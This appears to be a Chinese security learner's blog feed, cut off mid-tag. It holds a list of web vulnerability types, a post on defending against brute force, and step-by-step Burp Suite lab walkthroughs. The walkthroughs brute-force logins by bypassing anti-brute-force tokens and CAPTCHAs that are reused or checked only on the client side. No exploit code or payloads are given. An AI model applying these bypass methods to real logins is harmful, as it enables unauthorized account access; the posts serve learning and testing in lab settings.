id="10）SSRF攻击（服务器端请求伪造）"><a href="#10）SSRF攻击（服务器端请求伪造）" class="headerlink" title="10）SSRF攻击（服务器端请求伪造）"></a>10）SSRF攻击（服务器端请求伪造）</h5><p>&emsp;&emsp;大部分的web应用都提供了从其他的服务器上获取数据的功能。通过使用指定的URL，web应用便可以获取图片，下载文件，读取文件内容等。SSRF的实质是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><p>&emsp;&emsp;一般情况下， SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>&emsp;&emsp;危害：</p><ul><li>内外网的端口和服务扫描</li><li>攻击运行在内网或本地的应用程序</li><li>攻击内网的web应用</li><li>读取本地敏感信息</li><li>等等</li></ul><p>&emsp;</p><h5 id="11）目录遍历"><a href="#11）目录遍历" class="headerlink" title="11）目录遍历"></a>11）目录遍历</h5><p>&emsp;&emsp;攻击者通过访问网站某一目录时，该目录没有默认首页文件或没有正确设置默认首页文件，将会把整个目录结构列出来，将网站结构完全暴露给攻击者； 攻击者可能通过浏览目录结构，访问到某些隐秘文件</p><p>&emsp;&emsp;（就是麻瓜构建网络吧把整个目录结构给直接列出来了，这不是纯笨比吗，有目录了，信息收集的东西就越多，就越好搞攻击）</p><p>&emsp;&emsp;危害：</p><ul><li>访问敏感文件</li><li>等等</li></ul><p>&emsp;</p><h5 id="12）文件读取"><a href="#12）文件读取" class="headerlink" title="12）文件读取"></a>12）文件读取</h5><p>&emsp;&emsp;任意文件读取是属于文件操作漏洞的一种，通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或写入任意内容，往往能够使攻击者从服务器上获取敏感文件，正常读取的文件没有经过校验或者校验不严格，用户可以控制这个变量或者变量读取任意文件。</p><p>&emsp;&emsp;危害：</p><ul><li>获取敏感文件</li><li>等等</li></ul><p>&emsp;</p><h5 id="13）文件下载"><a href="#13）文件下载" class="headerlink" title="13）文件下载"></a>13）文件下载</h5><p>&emsp;&emsp;很多网站由于业务需求，往往需要提供文件(附件)下载的功能块，但是如果对下载的文件没有做限制，直接通过绝对路径对其文件进行下载，那么，恶意用户就可以利用这种方式下载服务器的敏感文件，对服务器进行进一步的威胁和攻击。</p><p>&emsp;&emsp;危害：</p><ul><li>获取敏感文件</li><li>等等</li></ul><p>&emsp;</p><h5 id="14）命令执行"><a href="#14）命令执行" class="headerlink" title="14）命令执行"></a>14）命令执行</h5><p>&emsp;&emsp;当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击</p><p>&emsp;&emsp;危害：</p><ul><li>获取web服务程序的权限</li><li>执行系统命令</li><li>反弹shell</li><li>内网渗透</li><li>等等</li></ul><p>&emsp;</p><h5 id="15）XXE攻击（XML外部实体注入）"><a href="#15）XXE攻击（XML外部实体注入）" class="headerlink" title="15）XXE攻击（XML外部实体注入）"></a>15）XXE攻击（XML外部实体注入）</h5><p>&emsp;&emsp;从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。</p><p>&emsp;&emsp;（这玩意还是实践比较容易弄清楚）</p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>实习相关内容梳理（二）</title>
    <link href="/2022/08/03/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E5%9B%9B/"/>
    <url>/2022/08/03/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="实习相关内容梳理（二）"><a href="#实习相关内容梳理（二）" class="headerlink" title="实习相关内容梳理（二）"></a>实习相关内容梳理（二）</h1><p>&emsp;&emsp;今天依旧是梳理内容的一天捏。准备开始冲数据安全的技术层面啦٩(⊙o⊙*)و</p><h4 id="其他-数据出境相关概念解析"><a href="#其他-数据出境相关概念解析" class="headerlink" title="其他:数据出境相关概念解析"></a>其他:数据出境相关概念解析</h4><ul><li><p>第一部分：初阶–数据出境关键概念剖析</p></li><li><p>第二部分：进阶–《个人信息出境标准合同规定》高频问题与适用解读</p></li><li><p>第三部分：进阶–《数据出境安全评估办法》高频问题与适用解读</p></li><li><p>第四部分：高阶–  数据出海实践关键问题与海外SCC要点对比</p></li></ul><p>根据的公众号：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://mp.weixin.qq.com/s?__biz=MzU2NDk5Njg2OA==&amp;mid=2247489352&amp;idx=1&amp;sn=09b5bbca335c39c36b0d43b32e978e12&amp;chksm=fc432923cb34a0350243e4e9aebb1f0d245bb825b38d02f70e5833a8455e1361ca50b2a47e72&amp;scene=21#wechat_redirect<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>五所实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>如何防范暴力破解</title>
    <link href="/2022/08/02/%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/08/02/%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="如何防范暴力破解"><a href="#如何防范暴力破解" class="headerlink" title="如何防范暴力破解"></a>如何防范暴力破解</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;暴力破解的学习基本就告一段落了，接下来将加入另外一个课题了，这也是对自己以前学习的回顾了，当然后面在打CTF或者一些平台练习有用到的话，那再开一个主题吧，毕竟还是想成为一个安服崽的啦。</p><h4 id="2-防范方法"><a href="#2-防范方法" class="headerlink" title="2.防范方法"></a>2.防范方法</h4><ul><li><p>增加密码的长度，密码的长度最好是大于10位数以上（毕竟电脑算力有限）</p></li><li><p>增加密码的复杂度，密码码要尽可能有数字、大小写字母和特殊符号混合组成</p></li><li><p>去除一些默认的登录账号（admin、root等），仅添加普通账号，授予root的权限</p></li><li><p>修改默认端口，ssh的默认端口是22 黑客想要入侵别人时需要先使用端口扫描工具 扫描外网当中那些服务器是开启了22端口，然后再进行暴力破解，因此改端口也是个好办法</p></li><li><p>借助第三方工具防御，通过第三方根据检测我们认证日志，如果发现有疑似暴力破解的行为，就会对相应IP采取动作，如禁止该IP的继续登录行为。</p><p>（第三方工具举例：<a href="http://www.fail2ban.org/">http://www.fail2ban.org/</a> ）</p></li></ul><h4 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h4><p>&emsp;&emsp;其实用kali里面也有相关的暴力破解根据，我下载了镜像，也实践了对压缩包密码的暴力破解，就是花的时间长（忘记截图水博客了，呜呜呜。等有空再重做一遍吧）</p><center><img src="/img/%E7%AD%89%E4%BF%9D%E6%9A%82%E6%9B%B4/1.png" style="zoom: 150%;" /></center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于token防爆破的暴力破解</title>
    <link href="/2022/08/01/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/08/01/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="基于token防爆破的暴力破解"><a href="#基于token防爆破的暴力破解" class="headerlink" title="基于token防爆破的暴力破解"></a>基于token防爆破的暴力破解</h1><h4 id="前言：token防爆破原理"><a href="#前言：token防爆破原理" class="headerlink" title="前言：token防爆破原理"></a>前言：token防爆破原理</h4><p>&emsp;&emsp;① 当客户端发送请求时，服务器会对用户信息使用HS256算法及密钥进行签名，再将这个签名和数据一起作为Token一起返回给客户端</p><p>&emsp;&emsp;② 服务器不保存Token，客户端保存Token</p><p>&emsp;&emsp;③ 当客户端再次发送请求时，在请求信息中将Token一起发给服务器</p><p>&emsp;&emsp;④  服务器用同样的HS256算法和同样的密钥，对数据再进行一次签名，和客户端返回的Token的签名进行比较，如果验证成功，就向客户端返回请求的数据</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.jpg"></p><p>&emsp;&emsp;简单来说，就是在High里面添加了一个token，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会先检查token，只有token正确，才会处理客户端的请求。</p><h4 id="1-打开登录界面"><a href="#1-打开登录界面" class="headerlink" title="1.打开登录界面"></a>1.打开登录界面</h4><p>&emsp;&emsp;可以看见没有验证码：</p><center><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.jpg" style="zoom:67%;" /></center><h4 id="2-输-入账号密码查看反馈情况"><a href="#2-输-入账号密码查看反馈情况" class="headerlink" title="2.输/入账号密码查看反馈情况"></a>2.输/入账号密码查看反馈情况</h4><p>&emsp;&emsp;用户密码输入错误情况:</p><center><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;简单暴力破解的情况：</p><center><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.jpg" style="zoom:67%;" /></center><h4 id="3-使用burp进行抓包"><a href="#3-使用burp进行抓包" class="headerlink" title="3.使用burp进行抓包"></a>3.使用burp进行抓包</h4><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.jpg"></p><p>&emsp;&emsp;可以看见在数据包中存在token的使用来防止暴力破解，结合原理和前面的反馈，我们可以得知taken是每次提交都会发生变化的，所以如果我们想进行暴力破解的话要不就是把token给弄掉，要不就是每次破解自动获取新的token，当然第一种方法不现实（不攻击服务器没权限的话），所以我们尝试第二种办法。</p><h4 id="4-设置字典"><a href="#4-设置字典" class="headerlink" title="4.设置字典"></a>4.设置字典</h4><p>&emsp;&emsp;记住一定要forward数据包，在history中送到intruder板块，不然后面在设置Options递归内容的时候就看不到回应包的内容！！！！！！！！！！</p><p>&emsp;&emsp;（淦，我就吃了这个亏，一直没找到原因，我是傻呗！）</p><p>&emsp;&emsp;设置用户名和密码字典：</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.jpg"></p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.jpg"></p><h4 id="5-设置token的循环模式"><a href="#5-设置token的循环模式" class="headerlink" title="5.设置token的循环模式"></a>5.设置token的循环模式</h4><p>&emsp;&emsp;而token这里把type值修改为Recursive grep，也就是递归模式（也就是接着上一个的服务器个id值一直接力下去）</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/10.jpg"></p><p>&emsp;&emsp;在Options设置递归内容，要复制token此时的value内容</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.jpg"></p><p>&emsp;&emsp;复制到对应地方,位置就是在type值修改为Recursive grep的界面往下拉</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.jpg"></p><h4 id="6-设置线程数量"><a href="#6-设置线程数量" class="headerlink" title="6.设置线程数量"></a>6.设置线程数量</h4><p>&emsp;&emsp;必须把number of threads（线程）设置为1（因为，每次都需要去查看token的值，所以一次发一个，并且查看一个token）我用的burp pro 所以在Resource Pool里面设置，在burp版本中是在Options中设置，自己看着来吧。</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/11.jpg"></p><p>&emsp;&emsp;然后在Options中设置始终追随重定向</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/12.jpg"></p><h4 id="7-暴力就完事"><a href="#7-暴力就完事" class="headerlink" title="7.暴力就完事"></a>7.暴力就完事</h4><p>&emsp;&emsp;做完一切准备工作了，开始爆破</p><p><img src="/img/%E5%9F%BA%E4%BA%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/13.jpg"></p><p>&emsp;&emsp;可以看见显示爆破成功。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于验证码绕过（on server）的暴力破解</title>
    <link href="/2022/07/31/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/07/31/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="基于验证码绕过（on-server）的暴力破解"><a href="#基于验证码绕过（on-server）的暴力破解" class="headerlink" title="基于验证码绕过（on server）的暴力破解"></a>基于验证码绕过（on server）的暴力破解</h1><h4 id="1-打开登录界面"><a href="#1-打开登录界面" class="headerlink" title="1.打开登录界面"></a>1.打开登录界面</h4><p>&emsp;&emsp;可以看见存在验证码识别:</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.jpg" style="zoom:80%;" /></center><h4 id="2-输入账号密码查看反馈情况"><a href="#2-输入账号密码查看反馈情况" class="headerlink" title="2.输入账号密码查看反馈情况"></a>2.输入账号密码查看反馈情况</h4><p>&emsp;&emsp;用户密码输入错误情况</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.jpg" style="zoom: 67%;" /></center><p>&emsp;&emsp;验证码错误的情况：</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;验证码为空的情况：</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.jpg" style="zoom: 50%;" /></center><h4 id="3-使用burp进行抓包查看"><a href="#3-使用burp进行抓包查看" class="headerlink" title="3.使用burp进行抓包查看"></a>3.使用burp进行抓包查看</h4><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.jpg"></p><h4 id="4-尝试操作包中的验证码内容"><a href="#4-尝试操作包中的验证码内容" class="headerlink" title="4.尝试操作包中的验证码内容"></a>4.尝试操作包中的验证码内容</h4><p>&emsp;&emsp;删除验证码：</p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.jpg"></p><p>&emsp;&emsp;删除后发现反馈和不填验证码的效果是一样的。这说明后台对验证码进行了验证。</p><h4 id="5-使用Repeater模块"><a href="#5-使用Repeater模块" class="headerlink" title="5.使用Repeater模块"></a>5.使用Repeater模块</h4><p>&emsp;&emsp;尝试保证当前界面的验证码不变的情况下进行不同账户密码的登录情况</p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.jpg"></p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.jpg"></p><p>&emsp;&emsp;我们可以看见，在使用liaoyue和yue作为登录的账号密码时，验证码不改变，依旧反馈的是用户和密码错误。说明验证码并不是一码一用，只要不点击刷新这个验证码，就能一直用，生存期非常长。所以我们只需要固定验证码这个字符串，替换账号和密码就可以进行暴力破解。话不多说，开干！</p><h4 id="6-开始爆破"><a href="#6-开始爆破" class="headerlink" title="6.开始爆破"></a>6.开始爆破</h4><p>&emsp;&emsp;（具体过程不作更多阐述，可参考上上篇的基于表单的暴力破解，形式基本一样。）</p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.jpg"></p><p>&emsp;&emsp;可以看见显示爆破成功。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于验证码绕过（on client）的暴力破解</title>
    <link href="/2022/07/30/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/07/30/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="基于验证码绕过（on-client）的暴力破解"><a href="#基于验证码绕过（on-client）的暴力破解" class="headerlink" title="基于验证码绕过（on client）的暴力破解"></a>基于验证码绕过（on client）的暴力破解</h1><h4 id="1-打开登录界面"><a href="#1-打开登录界面" class="headerlink" title="1.打开登录界面"></a>1.打开登录界面</h4><p>&emsp;&emsp;可以看见存在验证码识别:</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.jpg" style="zoom: 67%;" /></center><h4 id="2-输入账号密码查看反馈情况"><a href="#2-输入账号密码查看反馈情况" class="headerlink" title="2.输入账号密码查看反馈情况"></a>2.输入账号密码查看反馈情况</h4><p>&emsp;&emsp;用户密码输入错误情况:</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.jpg" style="zoom:67%;" /></center>&emsp;&emsp;验证码错误的情况：<center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.jpg" style="zoom: 67%;" /></center><p>&emsp;&emsp;验证码为空的情况：</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.jpg" style="zoom: 67%;" /></center><h4 id="3-使用burp进行抓包"><a href="#3-使用burp进行抓包" class="headerlink" title="3.使用burp进行抓包"></a>3.使用burp进行抓包</h4><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.jpg" alt="image-20220801115855834"></p><h4 id="4-尝试操作包中的验证码内容"><a href="#4-尝试操作包中的验证码内容" class="headerlink" title="4.尝试操作包中的验证码内容"></a>4.尝试操作包中的验证码内容</h4><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.jpg"></p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.jpg"></p><p>&emsp;&emsp;删除后发现反馈和验证码输入正确的效果是一样的。这说明前台对验证码进行了验证。</p><h4 id="5-网页代码查看"><a href="#5-网页代码查看" class="headerlink" title="5.网页代码查看"></a>5.网页代码查看</h4><p>&emsp;&emsp;这里还提供一个思路就是使用开发者插件查看网页代码</p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.jpg"></p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.jpg"></p><p>&emsp;&emsp;这里发现一段用js写的函数，实现了验证码的产生和判断。那么可以猜测后端那边根本就没有验证验证码，所有关于验证码的东西全在前端上。</p><p>&emsp;&emsp;（首先使用开发者工具查看代码是最正确的办法，我这里直接删是为了偷懒！，结果想了想还是算了，不偷懒了）</p><h4 id="6-开始爆破"><a href="#6-开始爆破" class="headerlink" title="6.开始爆破"></a>6.开始爆破</h4><p>&emsp;&emsp;（具体过程不作更多阐述，可参考上一篇的基于表单的暴力破解，形式基本一样。）</p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/10.jpg"></p><p>&emsp;&emsp;可以看见显示爆破成功</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>实习相关内容梳理（一）</title>
    <link href="/2022/07/29/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%B8%89/"/>
    <url>/2022/07/29/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h1 id="实习相关内容梳理（一）"><a href="#实习相关内容梳理（一）" class="headerlink" title="实习相关内容梳理（一）"></a>实习相关内容梳理（一）</h1><p>&emsp;&emsp;签了保密协议的啦。这是保密内容，不能看哦，看看其他的把！接下来这几天实习的活都是这个了，干就完了！</p><p>&emsp;&emsp;保密协议，是指协议当事人之间就一方告知另一方的书面或口头信息，约定不得向任何第三方披露该等信息的协议。负有保密义务的当事人违反协议约定，将保密信息披露给第三方，将要承担民事责任甚至刑事责任。保密协议一般包括保密内容、责任主体、保密期限、保密义务及违约责任等条款。保密协议可以分为单方保密协议和双方保密协议。单方保密协议是指一方对另一方单方面负有保密义务的协议。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%B8%89/1.png" style="zoom:100%;" /></center>]]></content>
    
    
    <categories>
      
      <category>五所实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于表单的暴力破解</title>
    <link href="/2022/07/29/%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/07/29/%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h1><h4 id="1-表单登录界面"><a href="#1-表单登录界面" class="headerlink" title="1.  表单登录界面"></a>1.  表单登录界面</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.png"></p><p>&emsp;&emsp;通过登录界面可以看到没有验证码要求，可以直接使用暴力破解</p><h4 id="2-随意输入账号密码查看反馈情况"><a href="#2-随意输入账号密码查看反馈情况" class="headerlink" title="2. 随意输入账号密码查看反馈情况"></a>2. 随意输入账号密码查看反馈情况</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.png"></p><p>&emsp;&emsp;发现会提示显示账号密码并不存在</p><h4 id="3-使用burp进行抓包查看"><a href="#3-使用burp进行抓包查看" class="headerlink" title="3.使用burp进行抓包查看"></a>3.使用burp进行抓包查看</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.png"></p><h4 id="4-发送给intruder板块进行暴力破解操作"><a href="#4-发送给intruder板块进行暴力破解操作" class="headerlink" title="4.发送给intruder板块进行暴力破解操作"></a>4.发送给intruder板块进行暴力破解操作</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4-16590182420151.png"></p><p>&emsp;&emsp;注意使用类别，根据情况点击并使用add$设置变量</p><h4 id="5-buro选择字典形式"><a href="#5-buro选择字典形式" class="headerlink" title="5.buro选择字典形式"></a>5.buro选择字典形式</h4><p>&emsp;&emsp;可以使用Simple list手动在下面添加，也可以使用Runtime file添加字典，这里使用Runtime file。</p><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.png"></p><h4 id="6-构建用户名和密码字典"><a href="#6-构建用户名和密码字典" class="headerlink" title="6.构建用户名和密码字典"></a>6.构建用户名和密码字典</h4><p><img 